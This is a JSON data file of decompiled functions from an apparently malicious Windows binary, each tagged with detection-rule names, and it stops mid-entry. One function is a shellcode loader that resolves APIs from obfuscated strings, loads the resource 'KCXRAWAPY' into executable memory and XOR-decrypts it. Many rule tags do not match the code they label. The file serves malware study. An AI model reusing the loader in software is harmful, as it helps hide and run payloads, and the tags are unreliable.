    "14000251": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140002510(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uStackX24;\n    ulong uStackX32;\n    \n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    fcn.1400023d0(arg1, arg2, &uStackX24);\n    return;\n}\n",
        "token_count": 84
    },
    "1400031b": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.1400031b0(ulong arg1, int64_t *arg2)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uchar auStack936 [32];\n    uint32_t auStack904 [2];\n    int64_t iStack896;\n    ulong auStack888 [2];\n    char16_t *pcStack872;\n    int64_t iStack864;\n    ulong uStack856;\n    ushort uStack168;\n    ushort uStack166;\n    ushort uStack164;\n    ushort uStack162;\n    ushort uStack160;\n    ushort uStack158;\n    ushort uStack156;\n    ushort uStack154;\n    ushort uStack152;\n    ushort uStack150;\n    ushort uStack144;\n    ushort uStack142;\n    ushort uStack140;\n    ushort uStack138;\n    ushort uStack136;\n    ushort uStack134;\n    ushort uStack132;\n    ushort uStack130;\n    ushort uStack128;\n    ushort uStack126;\n    ushort uStack124;\n    ushort uStack122;\n    ushort uStack120;\n    ulong uStack112;\n    uint uStack104;\n    char cStack100;\n    ulong uStack96;\n    ulong uStack88;\n    ushort uStack80;\n    ulong uStack72;\n    ulong uStack64;\n    ushort uStack56;\n    uint64_t uStack48;\n    \n    uStack48 = *0x14003e1a0 ^ auStack936;\n    iStack864 = arg1;\n    uStack96 = str.LdrFindResource_U._0_8_;\n    uStack168 = 0x6e;\n    uStack88 = str.LdrFindResource_U._8_8_;\n    uStack80 = str.LdrFindResource_U._16_2_;\n    uStack72 = str.LdrAccessResource._0_8_;\n    uStack64 = str.LdrAccessResource._8_8_;\n    uVar7 = 0;\n    uStack56 = str.LdrAccessResource._16_2_;\n    uStack112 = str.VirtualAlloc._0_8_;\n    uStack104 = str.VirtualAlloc._8_4_;\n    cStack100 = str.VirtualAlloc[12];\n    uStack144 = 0x6b;\n    uStack142 = 0x65;\n    uStack140 = 0x72;\n    uStack138 = 0x6e;\n    uStack136 = 0x65;\n    uStack134 = 0x6c;\n    uStack132 = 0x33;\n    uStack164 = 100;\n    uStack130 = 0x32;\n    uStack126 = 100;\n    uStack166 = 0x74;\n    uStack162 = 0x6c;\n    uStack160 = 0x6c;\n    uStack156 = 100;\n    uStack158 = 0x2e;\n    uStack128 = 0x2e;\n    uStack124 = 0x6c;\n    uStack122 = 0x6c;\n    uStack120 = 0;\n    uStack154 = 0x6c;\n    uStack152 = 0x6c;\n    uStack150 = 0;\n    uVar1 = (**0x14003fdd8)(&uStack168);\n    uVar2 = (**0x14003fdd8)(&uStack144);\n    pcVar3 = (**0x14003fdd0)(uVar1, &uStack96);\n    pcVar4 = (**0x14003fdd0)(uVar1, &uStack72);\n    pcVar5 = (**0x14003fdd0)(uVar2, &uStack112);\n    iStack896 = 0;\n    auStack904[0] = 0;\n    pcStack872 = L\"KCXRAWAPY\";\n    uStack856 = 0x409;\n    (*pcVar3)(0x140000000, &pcStack872, 3, auStack888);\n    (*pcVar4)(0x140000000, auStack888[0], &iStack896, auStack904);\n    iVar6 = (*pcVar5)(0, auStack904[0], 0x3000, 0x40);\n    uVar9 = uVar7;\n    if (auStack904[0] == 0) {\n        *arg2 = iVar6;\n    }\n    else {\n        do {\n            uVar8 = uVar9 + 1;\n            *(uVar7 + iVar6) = *(uVar9 % 0x11 + 0x14002e5f0) ^ *(uVar7 + iStack896);\n            uVar7 = uVar7 + 1;\n            uVar9 = uVar8;\n        } while (uVar8 < auStack904[0]);\n        *arg2 = iVar6;\n    }\n    fcn.14001b410(uStack48 ^ auStack936);\n    return;\n}\n",
        "token_count": 1126
    },
    "1400057e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.1400057e0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(arg1 + 0x24) - *(arg1 + 0x1c);\n    iVar1 = *(arg1 + 0x28);\n    if (iVar1 != 0) {\n        iVar1 = *(iVar1 + 8);\n    }\n    (*_sym.imp.GDI32.dll_SetDIBitsToDevice)\n              (iVar1, *(arg1 + 0x18), *(arg1 + 0x1c), *(arg1 + 0x20) - *(arg1 + 0x18), iVar2, *(arg1 + 8), *(arg1 + 0xc)\n               , 0, iVar2, *(arg1 + 0x30), arg1 + 0x40, 0);\n    return;\n}\n",
        "token_count": 200
    },
    "14000ab8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.14000ab8c(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    int64_t arg1_00;\n    uint32_t uVar6;\n    uint32_t uStack104;\n    uint32_t uStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    int32_t iStack88;\n    int32_t iStack84;\n    int32_t iStack80;\n    int32_t iStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint auStack56 [5];\n    uchar auStack36 [28];\n    \n    uVar1 = fcn.140007b34(arg1);\n    arg1_00 = 0;\n    if (arg2 == 0) {\n        if ((uVar1 >> 0x1e & 1) == 0) {\n            iVar4 = (*_sym.imp.USER32.dll_GetWindow)(*(arg1 + 0x40), 4);\n        }\n        else {\n            iVar4 = (*_sym.imp.USER32.dll_GetParent)();\n        }\n        if ((iVar4 != 0) && (iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(iVar4, 0x36b),  iVar2 != 0)) {\n            iVar4 = iVar2;\n        }\n    }\n    else {\n        iVar4 = *(arg2 + 0x40);\n    }\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(arg1 + 0x40), &iStack88);\n    if ((uVar1 >> 0x1e & 1) == 0) {\n        if ((iVar4 != 0) &&\n           ((uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar4, 0xfffffff0),  (uVar1 >> 0x1c & 1) == 0 ||\n            ((uVar1 >> 0x1d & 1) != 0)))) {\n            iVar4 = arg1_00;\n        }\n        auStack56[0] = 0x28;\n        if (iVar4 == 0) {\n            piVar3 = fcn.14001276c();\n            iVar4 = arg1_00;\n            if (piVar3 != NULL) {\n                iVar4 = (**(*piVar3 + 0xe8))(piVar3);\n            }\n            if (iVar4 != 0) {\n                arg1_00 = *(iVar4 + 0x40);\n            }\n            uVar5 = fcn.140008020(arg1_00, 1);\n            fcn.1400080a0(uVar5, auStack56);\n            (*_sym.imp.USER32.dll_CopyRect)(&iStack72, auStack36);\n        }\n        else {\n            (*_sym.imp.USER32.dll_GetWindowRect)(iVar4, &iStack72);\n            uVar5 = fcn.140008020(iVar4, 2);\n            fcn.1400080a0(uVar5, auStack56);\n        }\n        (*_sym.imp.USER32.dll_CopyRect)();\n    }\n    else {\n        uVar5 = (*_sym.imp.USER32.dll_GetParent)(*(arg1 + 0x40));\n        (*_sym.imp.USER32.dll_GetClientRect)(uVar5, &uStack104);\n        (*_sym.imp.USER32.dll_GetClientRect)(iVar4, &iStack72);\n        (*_sym.imp.USER32.dll_MapWindowPoints)();\n    }\n    uVar1 = (iStack64 + iStack72) / 2 - (iStack80 - iStack88) / 2;\n    uVar6 = (iStack60 + iStack68) / 2 - (iStack76 - iStack84) / 2;\n    if (iStack96 < (iStack80 - iStack88) + uVar1) {\n        uVar1 = (iStack88 - iStack80) + iStack96;\n    }\n    if (uVar1 < uStack104) {\n        uVar1 = uStack104;\n    }\n    if (iStack92 < (iStack76 - iStack84) + uVar6) {\n        uVar6 = (iStack84 - iStack76) + iStack92;\n    }\n    if (uVar6 < uStack100) {\n        uVar6 = uStack100;\n    }\n    fcn.140007d10(arg1, 0, uVar1, uVar6);\n    return;\n}\n",
        "token_count": 1031
    },
    "14000bb1": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t fcn.14000bb14(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    uint32_t uVar4;\n    uchar auStackX24 [16];\n    \n    uVar4 = 0;\n    iVar2 = fcn.140006c48();\n    piVar3 = fcn.14000b0ec(**(iVar2 + 200), auStackX24);\n    if (*piVar3 == 0) {\n        if ((arg2 & 0x3fc0) == arg2) {\n            iVar2 = fcn.140006c48();\n            fcn.14000b074(**(iVar2 + 200));\n            uVar4 = 0x3fc0;\n        }\n    }\n    else {\n        iVar2 = fcn.140006c48();\n        iVar1 = fcn.14000b160(**(iVar2 + 200), arg1);\n        if (iVar1 != 0) {\n            uVar4 = arg2;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 247
    },
    "14001021": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140010214(ulong noname_0, uint *arg2, int64_t arg3, int64_t arg4)\n\n{\n    ulong uVar1;\n    \n    fcn.14001bd50(arg2, 0, 0x40);\n    *arg2 = 0x40;\n    if (arg3 != 0) {\n        arg3 = *(arg3 + 0x40);\n    }\n    if (arg4 == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetParent)(arg3);\n        arg2[1] = 1;\n        *(arg2 + 4) = arg3;\n        *(arg2 + 2) = uVar1;\n    }\n    else {\n        arg2[1] = 0;\n        *(arg2 + 2) = arg3;\n        *(arg2 + 4) = arg4;\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "140011eb": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140011eb8(ulong arg1, uint16_t *arg2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ulong uVar4;\n    code *pcVar5;\n    uint *puVar6;\n    int32_t *piVar7;\n    int64_t iVar8;\n    uint16_t uVar9;\n    int32_t iVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    uchar auStack792 [32];\n    uint16_t *puStack760;\n    uchar *puStack752;\n    uint16_t auStack744 [4];\n    int64_t iStack736;\n    int64_t iStack728;\n    uchar auStack720 [8];\n    int32_t aiStack712 [6];\n    uint uStack688;\n    uint uStack684;\n    uchar *puStack680;\n    ulong uStack656;\n    ulong uStack640;\n    ulong uStack632;\n    uchar auStack616 [260];\n    uchar uStack356;\n    uchar uStack355;\n    uchar auStack344 [288];\n    uint64_t uStack56;\n    \n    uStack632 = 0xfffffffffffffffe;\n    uStack56 = *0x14003e1a0 ^ auStack792;\n    iVar12 = 0;\n    auStack744[0] = 0;\n    iVar10 = 0;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (pcVar5 == NULL) {\n        iVar11 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"ntdll.dll\");\n        if (iVar11 != 0) {\n            auStack744[0] = 0;\n            puStack760 = auStack744;\n            (*_sym.imp.KERNEL32.dll_EnumResourceLanguagesA)(iVar11, 0x10, 1, 0x14001167c);\n            if (auStack744[0] != 0) {\n                uVar9 = auStack744[0] & 0x3ff;\n                aiStack712[0] = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(auStack744[0]);\n                aiStack712[1] = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(uVar9);\n                iVar10 = 2;\n            }\n        }\n    }\n    else {\n        auStack744[0] = (*pcVar5)();\n        uVar9 = auStack744[0] & 0x3ff;\n        aiStack712[0] = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(auStack744[0]);\n        aiStack712[1] = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(uVar9);\n        iVar10 = 2;\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4, \"GetSystemDefaultUILanguage\");\n        if (pcVar5 != NULL) {\n            auStack744[0] = (*pcVar5)();\n            uVar9 = auStack744[0] & 0x3ff;\n            aiStack712[2] = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(auStack744[0]);\n            aiStack712[3] = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(uVar9);\n            iVar10 = 4;\n        }\n    }\n    aiStack712[iVar10] = 0x800;\n    uStack355 = 0;\n    uStack356 = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0x140000000, auStack616, 0x105);\n    if (iVar2 != 0) {\n        fcn.14001bd50(&uStack688, 0, 0x38);\n        uStack688 = 0x38;\n        puStack680 = auStack616;\n        uStack656 = 1000;\n        uStack640 = 0x140000000;\n        uStack684 = 0x88;\n        fcn.140011694(&iStack736, 0xffffffffffffffff);\n        if ((((*0x140053350 == NULL) || ((iStack736 == -1 && (iStack736 = (**0x140053350)(),  iStack736 != -1)))) &&\n            (*0x140053360 != NULL)) && ((iStack736 != -1 && (iStack728 == 0)))) {\n            (**0x140053360)(iStack736, &iStack728);\n        }\n        iVar11 = iVar12;\n        if (iVar10 + 1 != 0) {\n            do {\n                if (aiStack712[iVar11] == 0x800) {\n                    iVar2 = fcn.14001cbc4(auStack720, 4, 0x14003181c);\n                    if (iVar2 != 0) {\n                        if (iVar2 == 0xc) {\n                            fcn.140005de8();\n                            pcVar5 = swi(3);\n                            (*pcVar5)();\n                            return;\n                        }\n                        if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n                            fcn.140005e30();\n                            pcVar5 = swi(3);\n                            (*pcVar5)();\n                            return;\n                        }\n                        if (iVar2 != 0x50) {\n                            fcn.140005e30();\n                            pcVar5 = swi(3);\n                            (*pcVar5)();\n                            return;\n                        }\n                    }\ncode_r0x0001400121a1:\n                    puVar6 = fcn.14001bc68();\n                    uVar1 = *puVar6;\n                    puVar6 = fcn.14001bc68();\n                    *puVar6 = 0;\n                    puStack752 = auStack720;\n                    puStack760 = arg2;\n                    uVar3 = fcn.14001c608(auStack344, 0x112, 0x111, arg1);\n                    piVar7 = fcn.14001bc68();\n                    if (*piVar7 == 0) {\n                        puVar6 = fcn.14001bc68();\n                        *puVar6 = uVar1;\ncode_r0x00014001220b:\n                        iVar8 = iVar12;\n                        if ((uVar3 != 0xffffffff) && (uVar3 < 0x112)) {\n                            iVar8 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n                        }\n                        if (iVar8 == 0) goto code_r0x000140012233;\n                    }\n                    else {\n                        piVar7 = fcn.14001bc68();\n                        if (*piVar7 == 0) goto code_r0x00014001220b;\n                        if (*piVar7 != 0xc) {\n                            if ((*piVar7 == 0x16) || (*piVar7 == 0x22)) {\n                                fcn.140001010(0x80070057);\n                                pcVar5 = swi(3);\n                                (*pcVar5)();\n                                return;\n                            }\n                            if (*piVar7 != 0x50) {\n                                fcn.140001010(0x80004005);\n                                pcVar5 = swi(3);\n                                (*pcVar5)();\n                                return;\n                            }\n                            goto code_r0x00014001220b;\n                        }\n                        fcn.140001010(0x8007000e);\n                    }\n                    if ((*0x140053358 != NULL) && (iStack736 != -1)) {\n                        if ((*0x140053368 != NULL) && (iStack728 != 0)) {\n                            iStack728 = 0;\n                            (**0x140053368)(0);\n                        }\n                        (**0x140053358)(iStack736);\n                    }\n                    goto code_r0x00014001230c;\n                }\n                iVar2 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(aiStack712[iVar11], 3);\n                if (iVar2 != 0) goto code_r0x0001400121a1;\ncode_r0x000140012233:\n                iVar11 = iVar11 + 1;\n            } while (iVar11 < iVar10 + 1);\n        }\n        if ((*0x140053358 != NULL) && (iStack736 != -1)) {\n            if ((*0x140053368 != NULL) && (iStack728 != 0)) {\n                iStack728 = 0;\n                (**0x140053368)(0);\n            }\n            (**0x140053358)(iStack736);\n        }\n    }\ncode_r0x00014001230c:\n    fcn.14001b410(uStack56 ^ auStack792);\n    return;\n}\n",
        "token_count": 1916
    },
    "14001393": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\ncode ** fcn.140013938(code **arg1, uint64_t arg2, code *arg3)\n\n{\n    fcn.140009874(arg1);\n    *arg1 = vtable.CDialog.0;\n    fcn.14001bd50(arg1 + 0x15, 0, 0x40);\n    arg1[0x16] = arg2 & 0xffff;\n    *(arg1 + 0x15) = arg2;\n    arg1[0x1a] = arg3;\n    return arg1;\n}\n",
        "token_count": 121
    },
    "140015b8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong * fcn.140015b8c(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    int64_t arg1_00;\n    uint32_t auStackX24 [2];\n    uchar auStackX32 [8];\n    \n    arg1_00 = arg1;\n    puVar1 = fcn.14001590c(arg1, arg2, auStackX24, auStackX32);\n    if (puVar1 == NULL) {\n        if (*(arg1_00 + 8) == 0) {\n            fcn.140017df4(arg1_00, *(arg1_00 + 0x10), 1);\n        }\n        puVar1 = fcn.140015b20(arg1);\n        puVar1[1] = arg2;\n        *puVar1 = *(*(arg1 + 8) + auStackX24[0] * 8);\n        *(*(arg1 + 8) + auStackX24[0] * 8) = puVar1;\n    }\n    return puVar1 + 2;\n}\n",
        "token_count": 241
    },
    "14001855": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140018550(ulong *hMem, ulong arg2, ulong noname_2, ulong arg4)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t *arg1;\n    ushort *puVar6;\n    uint64_t arg2_00;\n    int64_t arg2_01;\n    uint32_t uVar7;\n    uint64_t arg1_00;\n    int32_t iVar8;\n    uint64_t arg3;\n    bool bVar9;\n    uchar auStack200 [32];\n    uchar *puStack168;\n    uint uStack160;\n    ushort uStack152;\n    uchar auStack136 [64];\n    uint64_t uStack72;\n    \n    uStack72 = *0x14003e1a0 ^ auStack200;\n    uStack152 = noname_2;\n    if (*(hMem + 1) != 0) {\n        arg1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*hMem);\n        bVar9 = *(arg1 + 2) == -1;\n        if (*(arg1 + 2) == -1) {\n            uVar7 = arg1[3];\n        }\n        else {\n            uVar7 = *arg1;\n        }\n        iVar8 = (-bVar9 & 2) + 1;\n        iVar5 = iVar8 * 2;\n        if (bVar9) {\n            arg1[3] = arg1[3] | 0x40;\n        }\n        else {\n            *arg1 = *arg1 | 0x40;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg2);\n        if (iVar3 < 0x20) {\n            puStack168 = auStack136;\n            uStack160 = 0x20;\n            iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, arg2, 0xffffffff);\n            iVar3 = iVar5 + iVar3 * 2;\n            if (iVar5 <= iVar3) {\n                puVar6 = fcn.140018328(arg1);\n                iVar4 = 0;\n                if ((uVar7 & 0x40) != 0) {\n                    iVar4 = fcn.14001bb6c(iVar5 + puVar6);\n                    iVar4 = iVar5 + 2 + iVar4 * 2;\n                }\n                arg3 = iVar4 + 3 + puVar6 & 0xfffffffffffffffc;\n                arg1_00 = iVar3 + 3 + puVar6 & 0xfffffffffffffffc;\n                if (bVar9) {\n                    iVar2 = *(arg1 + 4);\n                }\n                else {\n                    iVar2 = *(arg1 + 2);\n                }\n                if ((iVar3 != iVar4) && (iVar2 != 0)) {\n                    arg2_00 = (*(hMem + 1) - arg3) + arg1;\n                    if (*(hMem + 1) < arg2_00) goto code_r0x000140018725;\n                    iVar4 = fcn.14001afb0(arg1_00, arg2_00, arg3, arg2_00);\n                    if (iVar4 != 0) {\n                        if (iVar4 == 0xc) {\n                            fcn.140005de8();\n                            pcVar1 = swi(3);\n                            (*pcVar1)();\n                            return;\n                        }\n                        if ((iVar4 == 0x16) || (iVar4 == 0x22)) {\n                            fcn.140005e30();\n                            pcVar1 = swi(3);\n                            (*pcVar1)();\n                            return;\n                        }\n                        if (iVar4 != 0x50) {\n                            fcn.140005e30();\n                            pcVar1 = swi(3);\n                            (*pcVar1)();\n                            return;\n                        }\n                    }\n                }\n                arg2_01 = iVar3 + iVar8 * -2;\n                *puVar6 = uStack152;\n                iVar5 = fcn.14001afb0(iVar5 + puVar6, arg2_01, auStack136, arg2_01);\n                if (iVar5 != 0) {\n                    if (iVar5 == 0xc) {\n                        fcn.140005de8();\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                    if ((iVar5 == 0x16) || (iVar5 == 0x22)) {\n                        fcn.140005e30();\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                    if (iVar5 != 0x50) {\n                        fcn.140005e30();\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                }\n                *(hMem + 1) = *(hMem + 1) + (arg1_00 - arg3);\n                (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*hMem);\n                *(hMem + 0xc) = 0;\n            }\n        }\n    }\ncode_r0x000140018725:\n    fcn.14001b410(uStack72 ^ auStack200);\n    return;\n}\n",
        "token_count": 1163
    },
    "140018ca": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.140018ca4(ulong noname_0, ulong noname_1, ulong arg3)\n\n{\n    ulong auStackX24 [2];\n    \n    auStackX24[0] = arg3;\n    fcn.140018bb4(noname_0, noname_1, auStackX24, 1);\n    return;\n}\n",
        "token_count": 79
    },
    "14001c00": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint64_t fcn.14001c000(uint8_t *arg1, uint8_t *arg2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint *puVar3;\n    uint64_t uVar4;\n    uint16_t uVar5;\n    uint64_t uVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uchar auStack40 [8];\n    int64_t iStack32;\n    int64_t iStack24;\n    char cStack16;\n    \n    fcn.14001be3c(auStack40, 0);\n    if ((arg1 == NULL) || (arg2 == NULL)) {\n        puVar3 = fcn.14001bc68();\n        *puVar3 = 0x16;\n        fcn.14001ed34(0, 0, 0, 0);\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n        uVar4 = 0x7fffffff;\n    }\n    else if (*(iStack32 + 8) == 0) {\n        uVar4 = fcn.14001d210(arg1, arg2);\ncode_r0x00014001bfda:\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n    }\n    else {\n        do {\n            uVar1 = *arg1;\n            puVar8 = arg1 + 1;\n            uVar4 = uVar1;\n            if (((*(uVar1 + 0x1d + iStack32) & 4) != 0) && (uVar4 = 0,  *puVar8 != 0)) {\n                uVar2 = *puVar8;\n                puVar8 = arg1 + 2;\n                uVar4 = CONCAT11(uVar1, uVar2);\n            }\n            uVar1 = *arg2;\n            puVar7 = arg2 + 1;\n            uVar6 = uVar1;\n            if (((*(uVar1 + 0x1d + iStack32) & 4) != 0) && (uVar6 = 0,  *puVar7 != 0)) {\n                uVar2 = *puVar7;\n                puVar7 = arg2 + 2;\n                uVar6 = CONCAT11(uVar1, uVar2);\n            }\n            uVar5 = uVar4;\n            if (uVar6 != uVar5) {\n                uVar4 = (-(uVar6 < uVar5) & 2) - 1;\n                goto code_r0x00014001bfda;\n            }\n            arg2 = puVar7;\n            arg1 = puVar8;\n        } while (uVar5 != 0);\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 701
    },
    "14000754": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint64_t fcn.140007548(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = arg1[1];\n    if (iVar1 != 0) {\n        iVar2 = fcn.140006c98();\n        if (*(iVar2 + 0x38) != 0) {\n            fcn.1400159b8(*(iVar2 + 0x38) + 0x30, arg1[1]);\n        }\n    }\n    (**(*arg1 + 0x28))(arg1);\n    arg1[1] = 0;\n    return iVar1;\n}\n",
        "token_count": 143
    },
    "14000780": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint64_t fcn.14000780c(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = *(arg1 + 8);\n    if (iVar1 != 0) {\n        iVar2 = fcn.140006c98();\n        if (*(iVar2 + 0x40) != 0) {\n            fcn.1400159b8(*(iVar2 + 0x40) + 0x30, *(arg1 + 8));\n        }\n    }\n    *(arg1 + 8) = 0;\n    return iVar1;\n}\n",
        "token_count": 135
    },
    "14000b3d": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000b3dc(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140006c98();\n    if (*(iVar1 + 0x28) != 0) {\n        fcn.140015944(*(iVar1 + 0x28) + 0x30, arg1);\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "14000b46": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint64_t fcn.14000b468(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = *(arg1 + 0x40);\n    if (iVar1 != 0) {\n        iVar2 = fcn.140006c98();\n        if (*(iVar2 + 0x28) != 0) {\n            fcn.1400159b8(*(iVar2 + 0x28) + 0x30, *(arg1 + 0x40));\n        }\n        *(arg1 + 0x40) = 0;\n    }\n    *(arg1 + 0xa0) = 0;\n    return iVar1;\n}\n",
        "token_count": 155
    },
    "14000b6d": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint64_t fcn.14000b6d8(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    \n    uVar4 = 0;\n    if (*(arg1 + 0x40) == 0) {\n        if (*(arg1 + 0xa0) == 0) {\n            return 0;\n        }\n        if (*(arg1 + 0x40) == 0) goto code_r0x00014000b721;\n    }\n    iVar3 = fcn.140006c98();\n    if (*(iVar3 + 0x28) == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        uVar4 = (*pcVar1)();\n        return uVar4;\n    }\n    fcn.140015944(*(iVar3 + 0x28) + 0x30, *(arg1 + 0x40));\ncode_r0x00014000b721:\n    if ((*(arg1 + 0x40) != 0) || (*(arg1 + 0xa0) != 0)) {\n        if (*(arg1 + 0xa0) == 0) {\n            uVar2 = (*_sym.imp.USER32.dll_DestroyWindow)();\n        }\n        else {\n            uVar2 = (**(**(arg1 + 0xa0) + 0xb0))();\n        }\n        uVar4 = uVar2;\n    }\n    return uVar4;\n}\n",
        "token_count": 342
    },
    "140016e1": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140016e1c(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140006c98();\n    if (*(iVar1 + 0x30) != 0) {\n        fcn.140015944(*(iVar1 + 0x30) + 0x30, arg1);\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "140016e4": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint64_t fcn.140016e48(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = *(arg1 + 8);\n    if (iVar1 != 0) {\n        iVar2 = fcn.140006c98();\n        if (*(iVar2 + 0x30) != 0) {\n            fcn.1400159b8(*(iVar2 + 0x30) + 0x30, *(arg1 + 8));\n        }\n    }\n    *(arg1 + 8) = 0;\n    return iVar1;\n}\n",
        "token_count": 135
    },
    "14001065": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
